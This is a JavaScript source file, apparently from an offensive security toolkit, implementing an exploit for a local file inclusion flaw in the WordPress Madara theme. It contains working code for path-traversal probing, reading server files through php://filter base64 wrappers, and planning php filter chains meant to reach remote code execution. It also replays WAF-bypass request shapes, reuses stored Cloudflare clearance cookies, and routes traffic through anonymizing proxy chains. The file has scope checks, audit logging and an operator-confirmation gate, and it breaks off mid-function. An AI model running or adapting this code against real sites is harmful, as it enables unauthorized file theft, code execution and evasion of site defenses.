// VARVEL -- lfichain: the LFI exploitation toolkit for the CVE-2025-4524 class
// (unauthenticated WordPress Madara theme LFI: POST /wp-admin/admin-ajax.php,
// action=madara_load_more, the template parameter passed to a PHP include).
// Generalized: the injection point + body template are parameters; Madara is the
// default profile. A cvepack (engine/cvepacks.mjs) can call probeLfi later to
// upgrade a version-matched 'firm' CVE-2025-4524 to an evidence-backed verdict --
// capabilityToFinding() is the seam.
//
// Why it exists: wafbypass discovers WHICH mutation shape passes the WAF; lfichain
// consumes a known-good shape and answers "given a working LFI, how far can we go
// WITHOUT an account, read-only-first?" Four modes:
//   probe      -- traversal verification with benign markers, wrapper support,
//                 suffix-constraint inference. Output: a capability matrix.
//   read       -- php://filter base64 exfiltration of server paths. OPSEC: file
//                 CONTENTS never touch console/logs; decoded bytes go to the
//                 evidence dir, the report carries only {path, sha256, size}.
//   rce-oracle -- wrapwrap-style php-filter-chain RCE primitives + an oracle
//                 confirmation loop. HITL-GATED on --operator-confirm.
//   sesscheck  -- PHP session-file inclusion feasibility (detection only).
//
// THE HONESTY CONTRACT (non-negotiable): a capability is claimed ONLY on observed
// marker evidence (traversal: the marker regex in the response; wrappers: a base64
// blob that decodes to the marker; RCE: the payload's execution marker in the
// response). Unobserved is reported as unobserved, never as absent. Modes NEVER
// throw: every precondition miss is a fail-closed { ok:false, reason }.
//
// GOVERNANCE (same doctrine as tools/wafbypass.mjs, mirrored deliberately):
//   1. The signed engagement scope is checked BEFORE any request -- target host
//      resolved, EVERY resolved IP must sit inside the signed CIDRs; no scope,
//      no requests (fail-closed). The refusal prints the signed scope.
//   2. All egress rides the ghost chain (engine/ghost): a public target with no
//      configured (and in required mode, verified) chain is refused fail-closed;
//      private/range targets go direct per ghost doctrine.
//   3. One audit line per run (JSONL; injectable sink for tests).
//   4. Paced sequential requests (default 1200ms, request-start to request-start).
//
// THE VAULT RIDE (2026-08-10, the manhuaus lesson: a cookieless probe against a
// Cloudflare-challenged zone is burned at the edge even when a valid clearance
// sits in the vault): every mode AUTO-RIDES a valid, unexpired clearance vault
// entry for the target zone by default -- each request (including rce-oracle's
// single confirmation) carries the entry's EXACT cookie + UA (scrubHeaders pins
// the vault UA through the persona scrub) over the transport the entry's
// egressId binds (broker.resolveRideTransport; its fail-closed states are
// inherited as refusals). The lookup runs under rideEgressId parity (the egress
// id the mint side vaults under); opts.egressId / opts.vaultPath / opts.ghost
// are the seams. --no-ride forces cookieless; no valid/expired entry proceeds
// cookieless with an explicit gaps[] note, never a silent assumption. Reports
// name the ride ({ ride: { egressId, transport, mintedAt, expiresAt } }); the
// cookie itself is a live credential and NEVER appears in a report or audit line.
//
// THE SHAPE CONTRACT (what wafbypass hands over): a shape JSON is either
//   (a) an inline shape: { method?, contentType?, bodyTemplate?, headers?,
//        paramMode?, bodyKind?, valueTemplate?, traversalPrefix? } where
//        bodyTemplate carries the {{LFI}} placeholder and valueTemplate carries
//        {{PATH}} -- or
//   (b) a wafbypass report (or a single passingShapes[] entry): the first passing
//        mutation's payload is re-targeted by replacing its base target suffix
//        (etc/passwd, any encoding form) with {{PATH}}, and its param/body games
//        (dup-first/dup-last/array/multipart) are replayed identically.
// --param/--action rebuild the default Madara body 'action=<action>&<param>={{LFI}}'.
//
// THE EMULATOR RESTRICTION (rce-oracle, load-bearing): the only filter transforms
// implemented are ones Node can emulate EXACTLY and natively:
//   convert.base64-encode / convert.base64-decode
//   convert.iconv.UTF-8.UTF-16LE  (widen:  ASCII byte b -> b 00)
//   convert.iconv.UTF-16LE.UTF-8  (narrow: b 00 -> b; fatal on truncated/invalid)
//   convert.iconv.UTF-16LE.UTF-16BE (byte-pair swap; even lengths only)
// TextDecoder('utf-8'|'utf-16le', {fatal:true}) + Buffer give ground-truth
// emulation for these five, so every primitive is honestly unit-testable.
// THE COST, stated plainly: full wrapwrap (Synacktiv 2024) carries ~15 iconv
// conversions chosen from a precomputed table because those conversions CHANGE
// 6-bit base64 values. Our restricted set mostly CONSERVES the value multiset
// (the E/D/W pair-swap lemma pinned in the tests: on clean 4-aligned base64,
// E(D(W(S))) === W(S) -- values are only reordered, never created; new values
// arise only at decode-loss boundaries and from NUL-injection via widen/narrow).
// Consequence: chains are longer when they exist at all, and some payloads are
// unreachable from some resources. The planner reports that honestly
// ({ ok:false, reason }) instead of pretending -- and the whole mode is marked
// 'node-emulator; PHP ground-truth validation PENDING' until a real PHP harness
// (php:8-cli container) confirms the emulated edge semantics ('=' stop, partial
// trailing quanta, iconv failures on truncated units). Honesty over coverage.

import http from 'node:http';
import https from 'node:https';
import dns from 'node:dns';
import { createHash } from 'node:crypto';
import { appendFileSync, mkdirSync, writeFileSync } from 'node:fs';
import { join, dirname, basename } from 'node:path';
import { fileURLToPath } from 'node:url';
import { Ghost, isPrivateDest, scrubHeaders, chainEgressId } from '../engine/ghost.mjs';
import { inAnyCidr, parseIp } from '../engine/ipaddr.mjs';
import { Settings } from '../engine/settings.mjs';
import { clearanceFor, resolveRideTransport } from './clearance/broker.mjs';

const BODY_CAP = 256 * 1024;   // marker evidence lives in the body; cap like cfmap/wafbypass
const DEFAULT_PACE = 1200;     // human cadence -- WAF'd targets rate-limit the impatient
const DEFAULT_TIMEOUT = 12000;
const PLACEHOLDER = '{{LFI}}';
const PATH_TOKEN = '{{PATH}}';

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const msg = (e) => String((e && e.message) || e);

// The CVE class this toolkit serves. engine/cvepacks.mjs keys findings by CVE id;
// probe results carry it so a future pack entry can cross-reference.
export const CVE_ID = 'CVE-2025-4524';

// ---------------------------------------------------------------------------
// Filter primitives (the emulated set -- exact semantics, unit-tested).
// ---------------------------------------------------------------------------

// convert.base64-encode: RFC 4648 with '=' padding. Identical to PHP.
export function phpB64Encode(buf) {
  return Buffer.from(buf).toString('base64');
}

// convert.base64-decode, PHP semantics (emulated; PHP-validation pending):
//   - characters outside the alphabet are SKIPPED (non-strict decoding),
//   - decoding STOPS at the first '=' (padding terminates the stream),
//   - a trailing partial quantum still decodes: 2 chars -> 1 byte, 3 -> 2 bytes,
//     a single leftover char is dropped.
// Derivation example (pinned in tests): 'QUI' -> values Q=16,U=20,I=8 ->
//   byte0 = (16<<2)|(20>>4) = 64|1 = 65 'A'; byte1 = ((20&15)<<4)|(8>>2) = 64|2 = 66 'B'.
export function phpB64Decode(str) {
  const clean = [];
  for (const ch of String(str)) {
    if (ch === '=') break;                       // padding terminates decoding
    if (/[A-Za-z0-9+/]/.test(ch)) clean.push(ch);
  }
  const vals = clean.map((c) => 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'.indexOf(c));
  const out = [];
  let i = 0;
  for (; i + 4 <= vals.length; i += 4) {
    const n = (vals[i] << 18) | (vals[i + 1] << 12) | (vals[i + 2] << 6) | vals[i + 3];
    out.push((n >> 16) & 0xff, (n >> 8) & 0xff, n & 0xff);
  }
  const rem = vals.length - i;
  if (rem === 2) {                                // 2 chars -> 1 byte
    out.push(((vals[i] << 2) | (vals[i + 1] >> 4)) & 0xff);
  } else if (rem === 3) {                         // 3 chars -> 2 bytes
    out.push(((vals[i] << 2) | (vals[i + 1] >> 4)) & 0xff,
             (((vals[i + 1] & 15) << 4) | (vals[i + 2] >> 2)) & 0xff);
  }                                               // rem === 1: dropped
  return Buffer.from(out);
}

// Alignment/padding introspection for chain construction: how a base64 string
// would decode -- valid char count, complete quanta, and the trailing-remainder
// fate (the 'trim' boundary where chains lose characters on purpose).
export function b64QuantumInfo(str) {
  let valid = 0;
  const s = String(str);
  for (const ch of s) {
    if (ch === '=') break;
    if (/[A-Za-z0-9+/]/.test(ch)) valid++;
  }
  const quanta = Math.floor(valid / 4);
  const rem = valid % 4;
  return { valid, quanta, remainder: rem, dropped: rem === 1 ? 1 : 0, decodedBytes: quanta * 3 + (rem === 2 ? 1 : rem === 3 ? 2 : 0) };
}

// convert.iconv.UTF-16LE.UTF-16BE (and its inverse -- the same involution):
// swap adjacent byte pairs. PHP's iconv refuses a truncated multibyte unit, so
// an odd byte length is a step ERROR (the planner never offers it).
export function swapPairs(buf) {
  const b = Buffer.from(buf);
  if (b.length % 2) return { ok: false, error: 'odd byte length -- PHP iconv rejects a truncated UTF-16 unit' };
  const out = Buffer.alloc(b.length);
  for (let i = 0; i < b.length; i += 2) { out[i] = b[i + 1]; out[i + 1] = b[i]; }
  return { ok: true, buf: out };
}

// convert.iconv.UTF-8.UTF-16LE (widen): decode UTF-8 strictly, re-emit UTF-16LE.
// Fatal on ill-formed UTF-8 (PHP iconv likewise errors on illegal sequences).
export function widenUtf16(buf) {
  let s;
  try { s = new TextDecoder('utf-8', { fatal: true }).decode(buf); }
  catch { return { ok: false, error: 'ill-formed UTF-8 -- iconv would error on the illegal sequence' }; }
  return { ok: true, buf: Buffer.from(s, 'utf16le') };
}

// convert.iconv.UTF-16LE.UTF-8 (narrow): decode UTF-16LE strictly, re-emit UTF-8.
// Fatal on a truncated unit (odd length) or an unpaired surrogate.
export function narrowUtf16(buf) {
  let s;
  try { s = new TextDecoder('utf-16le', { fatal: true }).decode(buf); }
  catch { return { ok: false, error: 'truncated/invalid UTF-16LE -- iconv would error' }; }
  return { ok: true, buf: Buffer.from(s, 'utf8') };
}

// The emulated move set, in planner preference order.
export const FILTER_STEPS = {
  'convert.base64-decode': (b) => ({ ok: true, buf: phpB64Decode(b) }),
  'convert.base64-encode': (b) => ({ ok: true, buf: Buffer.from(phpB64Encode(b), 'latin1') }),
  'convert.iconv.UTF-16LE.UTF-16BE': swapPairs,
  'convert.iconv.UTF-8.UTF-16LE': widenUtf16,
  'convert.iconv.UTF-16LE.UTF-8': narrowUtf16,
};
export const MOVE_ORDER = Object.keys(FILTER_STEPS);

// Apply a chain of filter-step names to resource bytes (the emulator).
// Returns { ok:true, buf } or { ok:false, error, atStep } -- a failed step fails
// the chain, exactly as a failed iconv conversion fails the include.
export function applyChain(resource, steps) {
  let buf = Buffer.from(resource);
  for (let i = 0; i < steps.length; i++) {
    const fn = FILTER_STEPS[steps[i]];
    if (!fn) return { ok: false, error: 'unknown filter step ' + JSON.stringify(steps[i]), atStep: i };
    const r = fn(buf);
    if (!r.ok) return { ok: false, error: r.error, atStep: i };
    buf = r.buf;
  }
  return { ok: true, buf };
}

// The php://filter URI for a chain over a resource path.
export function chainUri(resourcePath, steps) {
  return 'php://filter/' + steps.join('|') + '/resource=' + resourcePath;
}

// ---------------------------------------------------------------------------
// Payload handling: alignment padding + the statically-derived oracle marker.
// ---------------------------------------------------------------------------

// Pad a payload so its byte length is a multiple of 3 (clean base64 quanta when
// the payload itself passes through an encode stage). Padding is only meaningful
// AFTER a closing '?>' (trailing newlines are inert output there); a payload
// without a closing tag cannot be padded predictably and is refused when padding
// is needed. Returns { ok, buf, padded, reason? }.
export function padPayload(payload) {
  const buf = Buffer.isBuffer(payload) ? Buffer.from(payload) : Buffer.from(String(payload), 'utf8');
  if (buf.length === 0) return { ok: false, reason: 'empty payload' };
  const need = (3 - (buf.length % 3)) % 3;
  if (need === 0) return { ok: true, buf, padded: 0 };
  if (!buf.includes('?>')) {
    return { ok: false, reason: 'payload needs ' + need + ' padding byte(s) for base64 alignment but has no closing "?>" -- trailing bytes would be parsed as PHP; refusing (fail-closed)' };
  }
  return { ok: true, buf: Buffer.concat([buf, Buffer.alloc(need, 0x0a)]), padded: need };
}

// The oracle marker must be derivable WITHOUT executing anything: we support
// payloads whose observable effect is a single static echo, e.g.
//   <?php echo 'MARKER'; ?>
// Anything else (dynamic output, side effects) is refused -- no predicted marker,
// no oracle, no claim.
export function markerFromPayload(payload) {
  const m = /echo\s+'([^'\r\n]{4,64})'/.exec(String(payload));
  return m ? m[1] : null;
}

// Harmless default: proof of execution is a static marker echo -- no system
// interaction, no filesystem writes, nothing to clean up. 35 bytes; padPayload
// extends it to 36 (a clean base64 quantum boundary).
export const DEFAULT_PAYLOAD = "<?php echo 'VARVEL-LFICHAIN-OK'; ?>";
export const DEFAULT_MARKER = 'VARVEL-LFICHAIN-OK';

// ---------------------------------------------------------------------------
// The deterministic chain planner (wrapwrap-style, restricted move set).
// ---------------------------------------------------------------------------
// Best-first beam search over emulated states: from the resource bytes, apply
// moves from FILTER_STEPS until a state begins with the (padded) payload -- then
// the server-side include receives the payload as leading bytes and executes it.
// (Prefix placement, not "anywhere": garbage BEFORE the payload could itself
// contain '<?' and hijack the PHP parse -- the prefix is the only reliable slot.)
// The search is fully deterministic: fixed move order, deterministic tie-breaks,
// visited-set on state bytes. Bounds make every run finite. When the restricted
// set cannot forge the prefix within bounds, the planner says so -- that is the
// documented cost of the restriction, not a bug.

function commonPrefixLen(buf, target) {
  const n = Math.min(buf.length, target.length);
  let i = 0;
  while (i < n && buf[i] === target[i]) i++;
  return i;
}

export function planForgeChain({ resource, payload, maxSteps = 12, beam = 32, maxStates = 5000, maxStateBytes = 2048 } = {}) {
  const pad = padPayload(payload);
  if (!pad.ok) return { ok: false, reason: pad.reason, explored: 0 };
  const target = pad.buf;
  const startsWith = (buf) => buf.length >= target.length && buf.subarray(0, target.length).equals(target);
  const start = Buffer.from(resource);
  if (startsWith(start)) return { ok: true, steps: [], explored: 0, note: 'resource already begins with the payload -- no filters needed' };

  const visited = new Set([start.toString('base64')]);
  let frontier = [{ buf: start, steps: [] }];
  let explored = 0;
  for (let depth = 0; depth < maxSteps; depth++) {
    const next = [];
    for (const st of frontier) {
      for (const move of MOVE_ORDER) {
        const r = FILTER_STEPS[move](st.buf);
        if (!r.ok) continue;                                   // illegal move (odd length, invalid input)
        if (r.buf.length === 0 || r.buf.length > maxStateBytes) continue;
        const key = r.buf.toString('base64');
        if (visited.has(key)) continue;
        visited.add(key);
        const steps = st.steps.concat(move);
        explored++;
        if (explored > maxStates) {
          return { ok: false, reason: 'search budget exhausted (maxStates ' + maxStates + ') -- the restricted move set could not forge this prefix; full wrapwrap uses ~15 iconv charsets for exactly this reach', explored };
        }
        if (startsWith(r.buf)) return { ok: true, steps, explored };
        next.push({ buf: r.buf, steps, score: commonPrefixLen(r.buf, target) });
      }
    }
    if (!next.length) return { ok: false, reason: 'no legal moves remain -- prefix unreachable with the restricted move set', explored };
    next.sort((a, b) => (b.score - a.score) || (a.steps.length - b.steps.length) || (a.steps.join('|') < b.steps.join('|') ? -1 : 1));
    frontier = next.slice(0, beam);
  }
  return { ok: false, reason: 'no chain within maxSteps ' + maxSteps + ' -- prefix not forgeable with the restricted move set inside bounds (documented cost: the full wrapwrap charset table is what buys universality)', explored };
}

// ---------------------------------------------------------------------------
// Base64 exfiltration parsing: locate + decode the blob in a response body.
// ---------------------------------------------------------------------------

// Fraction of bytes that render as text (tab/CR/LF/printable ASCII).
function printableRatio(buf) {
  if (!buf.length) return 0;
  let good = 0;
  for (const b of buf) { if (b === 9 || b === 10 || b === 13 || (b >= 32 && b <= 126)) good++; }
  return good / buf.length;
}

// All plausible base64 runs in a body (longest first), each pre-decoded.
// Known limit, stated honestly: JSON-escaped slashes ('\/') split runs; WordPress
// ajax responses that embed included content are HTML fragments in practice, so
// the standard-run extraction is the right 95% tool -- decoys are filtered by
// printableRatio + marker selection downstream, not by pretending we parse JSON.
export function extractB64Candidates(body, { minLen = 32 } = {}) {
  const s = String(body || '');
  const out = [];
  const re = new RegExp('[A-Za-z0-9+/=]{' + Math.max(8, minLen) + ',}', 'g');
  let m;
  while ((m = re.exec(s))) {
    const bytes = phpB64Decode(m[0]);
    if (bytes.length < 8) continue;              // too short to be a file exfil
    out.push({ encoded: m[0], bytes, offset: m.index, ratio: printableRatio(bytes) });
  }
  out.sort((a, b) => b.encoded.length - a.encoded.length);
  return out;
}

// Pick the exfil blob: printable first; when a marker regex is given, the first
// candidate whose decoded TEXT matches wins (marker evidence beats size).
export function selectDecoded(candidates, { markerRe, minRatio = 0.85 } = {}) {
  const printable = (candidates || []).filter((c) => c.ratio >= minRatio);
  if (markerRe) {
    const hit = printable.find((c) => markerRe.test(c.bytes.toString('latin1')));
    if (hit) return hit;
  }
  return printable[0] || null;
}

// ---------------------------------------------------------------------------
// Profiles + the shape contract
// ---------------------------------------------------------------------------

// The default Madara profile (CVE-2025-4524): POST admin-ajax with the action
// dispatch and the template include parameter. --param/--action rebuild it.
export function madaraProfile({ param = 'template', action = 'madara_load_more' } = {}) {
  return {
    name: 'madara',
    method: 'POST',
    headers: {},
    bodyKind: 'form',          // form | multipart (admin-ajax dispatch requires form-encoding)
    paramMode: 'single',       // single | dup-first | dup-last | array (wafbypass param games)
    bodyTemplate: 'action=' + action + '&' + param + '=' + PLACEHOLDER,
    traversalPrefix: '../../../../',
    valueTemplate: null,       // set when a wafbypass passing payload carries the style
    param,
  };
}

// Re-target a wafbypass passing payload: its base target suffix (etc/passwd, in
// any encoding form the matrix emits) becomes the {{PATH}} slot. Everything else
// -- traversal style, encoding, parameter game -- is preserved verbatim.
export function shapeFromWafBypass(input) {
  const entry = input && Array.isArray(input.passingShapes) ? input.passingShapes[0]
    : (input && input.mutation ? input : null);
  if (!entry) return { ok: false, reason: 'no passingShapes[0] in the wafbypass report -- a shape is consumable only after wafbypass marker-verifies one' };
  const mut = entry.mutation || {};
  const payload = String(mut.payload || '');
  const lower = payload.toLowerCase();
  let idx = lower.lastIndexOf('etc/passwd');
  if (idx < 0) idx = lower.lastIndexOf('etc%2fpasswd');
  if (idx < 0) {
    return { ok: false, reason: 'the passing payload does not end with the LFI base target (etc/passwd) -- cannot re-target paths; supply an inline --shape instead' };
  }
  return {
    ok: true,
    shape: {
      valueTemplate: payload.slice(0, idx) + PATH_TOKEN,
      paramMode: mut.paramMode || 'single',
      bodyKind: mut.bodyKind || 'form',
      headers: mut.headers || {},
      fromWafbypass: { id: mut.id || null, family: mut.family || null, stability: entry.stability || null },
    },
  };
}

// Resolve the effective shape: inline --shape / --shape-file JSON (a raw shape,
// a wafbypass report, or one passingShapes entry), else the Madara default.
// Fail-closed: a body template without the {{LFI}} placeholder is a refusal.
export function loadShape(opts = {}) {
  let raw = null;
  if (opts.shape != null) {
    try { raw = typeof opts.shape === 'string' ? JSON.parse(opts.shape) : opts.shape; }
    catch (e) { return { ok: false, reason: '--shape is not valid JSON: ' + msg(e) }; }
  }
  const base = madaraProfile({ param: opts.param, action: opts.action });
  if (!raw) return { ok: true, profile: base };

  let shape = raw;
  if (raw.passingShapes || raw.mutation) {
    const conv = shapeFromWafBypass(raw);
    if (!conv.ok) return conv;
    shape = conv.shape;
  }
  const profile = { ...base, ...shape, param: base.param };
  if (shape.bodyTemplate != null) profile.bodyTemplate = String(shape.bodyTemplate);
  if (profile.bodyTemplate && !profile.bodyTemplate.includes(PLACEHOLDER)) {
    return { ok: false, reason: 'shape bodyTemplate has no ' + PLACEHOLDER + ' placeholder -- the injection point is undefined (fail-closed)' };
  }
  if (profile.valueTemplate != null && !String(profile.valueTemplate).includes(PATH_TOKEN)) {
    return { ok: false, reason: 'shape valueTemplate has no ' + PATH_TOKEN + ' slot -- cannot re-target resource paths (fail-closed)' };
  }
  return { ok: true, profile };
}

// The template value sent for a resource path.
//  - a shape valueTemplate wins (the WAF-passing style, re-targeted),
//  - absolute paths and wrapper URIs pass through untouched,
//  - anything else gets the traversal prefix.
export function resourceFor(profile, path) {
  const p = String(path);
  if (profile.valueTemplate) return String(profile.valueTemplate).split(PATH_TOKEN).join(p);
  if (/^php:\/\//i.test(p)) return p;
  if (/^([A-Za-z]:[\\/]|\/)/.test(p)) return p;
  return String(profile.traversalPrefix || '') + p;
}

// The php://filter base64-exfil wrapper URI for a path. When a wafbypass
// valueTemplate is active, the wrapper scheme itself is sent UNSTYLED -- the
// caller notes that WAF passage for the wrapper form is unverified.
export function wrapperFor(profile, path) {
  return 'php://filter/convert.base64-encode/resource=' + resourceFor(profile, path);
}

const BENIGN_VALUE = 'index';

// Build the request for one template value, replaying the shape's body games
// (mirrors tools/wafbypass.mjs buildRequest semantics for the lfi family).
export function buildRequest(profile, u, value) {
  const method = String(profile.method || 'POST').toUpperCase();
  const headers = { ...(profile.headers || {}) };
  const param = profile.param || 'template';
  const template = profile.bodyTemplate || null;
  const hasBody = method !== 'GET' && method !== 'HEAD';

  if (!hasBody) {
    const sep = u.search ? '&' : '?';
    return { method, url: u.origin + u.pathname + u.search + sep + param + '=' + value, headers, body: null };
  }
  let body = null;
  if (profile.bodyKind === 'multipart') {
    const boundary = '----varvellfichain7f3a9c';
    body = '--' + boundary + '\r\nContent-Disposition: form-data; name="' + param + '"\r\n\r\n' + value + '\r\n--' + boundary + '--\r\n';
    headers['content-type'] = 'multipart/form-data; boundary=' + boundary;
  } else {
    const inTemplate = (v) => (template ? template.split(PLACEHOLDER).join(v) : param + '=' + v);
    if (profile.paramMode === 'dup-first') body = inTemplate(value) + '&' + param + '=' + BENIGN_VALUE;
    else if (profile.paramMode === 'dup-last') body = inTemplate(BENIGN_VALUE) + '&' + param + '=' + value;
    else if (profile.paramMode === 'array') body = template ? template.split(PLACEHOLDER).join(value) : param + '[]=' + value;
    else body = inTemplate(value);
  }
  if (!headers['content-type'] && !Object.keys(headers).some((k) => k.toLowerCase() === 'content-type')) {
    headers['content-type'] = 'application/x-www-form-urlencoded';
  }
  return { method, url: u.href, headers, body };
}

// ---------------------------------------------------------------------------
// Governance: signed-scope check + ghost egress gate.
// Mirrors tools/wafbypass.mjs (same doctrine, deliberately re-implemented so
// this tool stays standalone): every resolved IP inside the signed CIDRs;
// public egress requires a configured (and in required mode, verified) chain.
// ---------------------------------------------------------------------------
async function defaultResolve(host) {
  const r = await dns.promises.lookup(host, { all: true });
  return r.map((x) => x.address);
}

export async function scopeCheck(u, scope, resolve) {
  const cidrs = (Array.isArray(scope) ? scope : String(scope || '').split(',')).map((s) => String(s).trim()).filter(Boolean);
  if (!cidrs.length) {
    return { ok: false, reason: 'no signed engagement scope supplied -- refusing (fail-closed). Re-run with --scope <cidrCsv> from the signed session scope.', scope: [] };
  }
  const host = u.hostname;
  let ips = [];
  const literal = parseIp(host);
  if (literal) {
    ips = [literal.text];
  } else {
    try { ips = await resolve(host); } catch (e) { return { ok: false, reason: 'could not resolve ' + host + ' for scope verification (' + msg(e) + ') -- refusing (fail-closed)', scope: cidrs }; }
    if (!ips.length) return { ok: false, reason: host + ' resolved to no addresses -- scope unverifiable, refusing (fail-closed)', scope: cidrs };
  }
  const outside = ips.filter((ip) => !inAnyCidr(ip, cidrs));
  if (outside.length) {
    return {
      ok: false,
      reason: 'target ' + host + ' resolves outside the signed engagement scope (' + outside.join(', ') + ' not in scope) -- request REFUSED. Signed scope: ' + cidrs.join(', '),
      scope: cidrs, resolved: ips, outside,
    };
  }
  return { ok: true, scope: cidrs, resolved: ips };
}

function ghostFromSettings(engagement) {
  const g = new Ghost();
  try {
    const s = Settings.for(engagement);
    const mode = s.get('ghost.mode');
    if (mode !== 'off') g.configure({ mode, chain: s.get('ghost.chain'), checkUrl: s.get('ghost.checkUrl') });
  } catch { /* an unconfigured ghost stays off: the gate refuses public egress */ }
  return g;
}

// ---------------------------------------------------------------------------
// The vault ride resolution (auto-ride; --no-ride forces cookieless). Mirrors
// tools/wafbypass.mjs (same doctrine, deliberately re-implemented so this tool
// stays standalone): the lookup egressId is derived from the SAME armed ghost
// the egress gate vetted (chain armed => the chain's canonical id, exactly what
// resolveMintEgress vaults under -- rideEgressId parity; else 'direct');
// opts.egressId overrides explicitly. A valid, unexpired entry binds the
// TRANSPORT through broker.resolveRideTransport -- its fail-closed refusals are
// inherited as run refusals. Applies to EVERY mode via prepare(), including
// rce-oracle's single confirmation request.
// Result: { ok:true, ride: null, gap? } | { ok:true, ride } | { ok:false, reason }.
// Never throws.
// ---------------------------------------------------------------------------
async function resolveVaultRide(u, opts, ghost) {
  try {
    if (opts.ride === false) return { ok: true, ride: null }; // --no-ride: forced cookieless, no vault read
    const ghostMode = opts.ghostMode || (ghost && ghost.mode) || 'off';
    let egressId = 'direct';
    if (opts.egressId) egressId = String(opts.egressId);
    else if (ghostMode !== 'off' && ghost && ghost.chain && ghost.chain.length) {
      try { egressId = chainEgressId(ghost.chain); } catch { egressId = 'direct'; }
    }
    const entry = await clearanceFor(u.href, { egressId, ...(opts.vaultPath ? { vaultPath: opts.vaultPath } : {}) });
    if (!entry) {
      return { ok: true, ride: null, gap: 'no valid clearance for zone ' + u.host + ' -- edge challenge likely; mint first (clearance mint) or provide operator clearance' };
    }
    const t = await resolveRideTransport({ ghost, ghostMode, egressId, hostname: u.hostname });
    if (!t.ok) return { ok: false, reason: t.reason + ' (or pass --no-ride to force a cookieless run)' };
    const cookie = (entry.cookies || []).map((c) => c.name + '=' + c.value).join('; ');
    return {
      ok: true,
      ride: { egressId, transport: t.transport, mintedAt: entry.mintedAt || null, expiresAt: entry.expiresAt || null, ua: entry.ua, cookie, agents: t.agents, direct: !!t.direct },
    };
  } catch (e) { return { ok: false, reason: 'vault ride resolution failed (' + msg(e) + ') -- refusing (fail-closed)' }; }
}

// The report-facing ride view: names the binding WITHOUT the credential material
// (the cookie and UA string ride the wire, never the report -- the same OPSEC
// doctrine as the masked session id and the evidence-dir-only file contents).
function rideReport(ride) {
  return ride ? { egressId: ride.egressId, transport: ride.transport, mintedAt: ride.mintedAt, expiresAt: ride.expiresAt } : null;
}

async function ensureGhost(ghost, u) {
  if (isPrivateDest(u.hostname)) return { ok: true, transport: 'direct (private/range destination -- ghost doctrine: lab traffic never leaves the lab)' };
  if (!ghost || ghost.mode === 'off' || !ghost.chain.length) {
    return { ok: false, reason: 'ghost chain unavailable -- public egress REFUSED (fail-closed). Configure ghost.mode + ghost.chain (e.g. Mullvad socks5://10.64.0.1:1080) and verify the exit first.' };
  }
  if (ghost.mode === 'required' && !ghost.verifiedOk()) {
    try { await ghost.verify(); } catch { /* verify failure is handled below */ }
    if (!ghost.verifiedOk()) {
      return { ok: false, reason: 'ghost mode is required but the chain exit is NOT verified (exit != operator IP unproven) -- public egress REFUSED (fail-closed). Run the ghost self-check first.' };
    }
  }
  return { ok: true, transport: 'ghost chain (' + ghost.chain.length + ' hop(s))' };
}

// ---------------------------------------------------------------------------
// Default requester: rides the ghost agents (chain for public, direct for
// private). With a vault ride the requester is bound to the ENTRY's transport
// instead (chain-keyed entry => the ghost chain's agents; a sanctioned direct
// ride must NOT silently re-enter the chain -- cf_clearance is IP-bound), and
// the clearance identity survives the scrub: the vault's EXACT UA is pinned as
// the persona, the entry's cookie header rides every request. Resolves
// { status, headers, body }; a network failure is DATA ({ status:0, error }),
// never an exception (cfmap doctrine).
// ---------------------------------------------------------------------------
function defaultRequester(ghost, { timeoutMs = DEFAULT_TIMEOUT, ride = null } = {}) {
  return ({ method, url, headers, body }) => new Promise((resolve) => {
    let u;
    try { u = new URL(String(url)); } catch { return resolve({ status: 0, error: 'unparseable request URL' }); }
    const agents = ride ? ride.agents : (ghost ? ghost.agents() : null);
    // Defense in depth: never emit public traffic without a chain, whatever the gate did
    // -- unless the ride gate sanctioned direct egress for this entry's binding.
    if (!isPrivateDest(u.hostname) && !agents && !(ride && ride.direct)) {
      return resolve({ status: 0, error: 'ghost chain unavailable -- public egress refused' });
    }
    const lib = u.protocol === 'https:' ? https : http;
    const hdrs = scrubHeaders({ accept: '*/*', ...(headers || {}), ...(ride && ride.cookie ? { cookie: ride.cookie } : {}) }, ride ? { ua: ride.ua } : undefined);
    let settled = false;
    const done = (v) => { if (settled) return; settled = true; resolve(v); };
    let req;
    try {
      req = lib.request({
        hostname: u.hostname, port: u.port || (u.protocol === 'https:' ? 443 : 80),
        path: u.pathname + u.search, method: method || 'GET', timeout: timeoutMs,
        rejectUnauthorized: false,
        agent: agents ? (u.protocol === 'https:' ? agents.httpsAgent : agents.httpAgent) : undefined,
        headers: hdrs,
      }, (r) => {
        let text = '';
        r.on('data', (d) => { if (text.length < BODY_CAP) text += d.toString('latin1', 0, Math.max(0, BODY_CAP - text.length)); });
        r.on('end', () => done({ status: r.statusCode, headers: r.headers, body: text }));
      });
    } catch (e) { return done({ status: 0, error: msg(e) }); }
    req.on('timeout', () => { try { req.destroy(); } catch {} done({ status: 0, error: 'request timed out (' + timeoutMs + 'ms)' }); });
    req.on('error', (e) => done({ status: 0, error: msg(e) }));
    if (body != null) req.write(body);
    req.end();
  });
}

// ---------------------------------------------------------------------------
// The audit line: one JSONL entry per run. Default sink appends to
// varvel/data/lfichain-audit.jsonl (best-effort, never throws); injectable.
// ---------------------------------------------------------------------------
const AUDIT_FILE = () => process.env.VARVEL_LFICHAIN_AUDIT || join(dirname(fileURLToPath(import.meta.url)), '..', 'data', 'lfichain-audit.jsonl');
function defaultAudit(entry) {
  try { mkdirSync(dirname(AUDIT_FILE()), { recursive: true }); appendFileSync(AUDIT_FILE(), JSON.stringify(entry) + '\n'); } catch { /* audit must never break the tool */ }
}

// ---------------------------------------------------------------------------
// Shared precondition pipeline: parse -> shape -> scope -> ghost -> requester.
// Returns { ok:false, reason } or the run context. Never throws.
// ---------------------------------------------------------------------------
async function prepare(url, opts, mode) {
  let u;
  try {
    u = new URL(String(url || ''));
    if (u.protocol !== 'http:' && u.protocol !== 'https:') throw new Error('scheme');
  } catch { return { ok: false, reason: 'usage: --url must be an http(s) URL, got ' + JSON.stringify(url) }; }

  const shaped = loadShape(opts);
  if (!shaped.ok) return shaped;

  // Same-origin guard (cfmap doctrine): an explicit shape URL may not pull the
  // run off-origin. --url is the endpoint; shape.endpointUrl may only restate it.
  if (opts.endpointUrl) {
    let eu;
    try { eu = new URL(String(opts.endpointUrl)); } catch { return { ok: false, reason: 'shape endpoint URL is unparseable' }; }
    if (eu.origin !== u.origin) {
